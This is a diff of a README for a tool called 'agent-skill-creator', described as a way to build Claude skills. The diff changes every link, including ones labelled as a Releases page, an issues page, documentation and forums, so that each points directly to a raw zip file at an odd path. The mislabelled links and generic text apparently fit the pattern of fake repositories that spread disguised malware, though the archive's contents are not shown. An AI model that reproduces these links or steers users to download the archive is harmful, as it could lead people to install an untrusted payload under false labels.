@@ -1,7 +1,7 @@
 # 🎉 agent-skill-creator - Create Agents Effortlessly with Claude Skills
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/references/examples/exports/stock-analyzer-cskill-api-v1.0.0.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/references/examples/exports/stock-analyzer-cskill-api-v1.0.0.zip)
+[![Download](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/unregeneracy/agent-skill-creator.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/unregeneracy/agent-skill-creator.zip)
 
 ## 🚀 Getting Started
 Welcome to **agent-skill-creator**! This tool helps you create agents with Claude Skills quickly and easily. The software allows you to teach Claude Code to automate agent-building tasks without needing technical skills. 
@@ -26,7 +26,7 @@ Follow these steps to install the **agent-skill-creator**:
 
 1. **Visit the Download Page:**
    Click the link below to access the Releases page:
-   [Download Latest Release](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/references/examples/exports/stock-analyzer-cskill-api-v1.0.0.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/unregeneracy/agent-skill-creator.zip)
 
 2. **Select the Latest Version:**
    On the Releases page, find the latest version of the software.
@@ -65,11 +65,11 @@ If you encounter issues, here are some common solutions:
 - **No Internet Connection:** Check if your internet is working properly.
 
 ## 📞 Support
-For further assistance, consider joining our community forums. Many users share tips and solutions there. If you need direct support, please submit an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/references/examples/exports/stock-analyzer-cskill-api-v1.0.0.zip).
+For further assistance, consider joining our community forums. Many users share tips and solutions there. If you need direct support, please submit an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/unregeneracy/agent-skill-creator.zip).
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/references/examples/exports/stock-analyzer-cskill-api-v1.0.0.zip)
-- [Community Forums](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/references/examples/exports/stock-analyzer-cskill-api-v1.0.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/unregeneracy/agent-skill-creator.zip)
+- [Community Forums](https://raw.githubusercontent.com/Narcanwaterworks118/agent-skill-creator/main/unregeneracy/agent-skill-creator.zip)
 
 ## 📅 Future Updates
 Stay tuned for future updates that will introduce new features, enhanced stability, and user-requested functionalities. Regular updates will allow you to get the most out of **agent-skill-creator**. 
